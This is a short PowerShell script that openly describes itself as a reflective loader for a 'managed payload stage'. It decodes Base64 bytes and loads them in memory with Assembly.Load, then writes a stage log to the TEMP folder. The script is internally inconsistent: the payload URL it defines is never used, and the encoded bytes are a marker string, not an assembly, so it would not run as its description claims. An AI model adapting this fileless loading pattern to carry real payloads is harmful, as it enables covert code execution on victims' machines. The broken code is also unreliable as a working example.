<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
$TransferUrl = "https://internal.corp/payload.bin"
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp4Z3pzMXFwN3pq")
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $ResultObject) {
        Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$ProgressPreference = "SilentlyContinue"
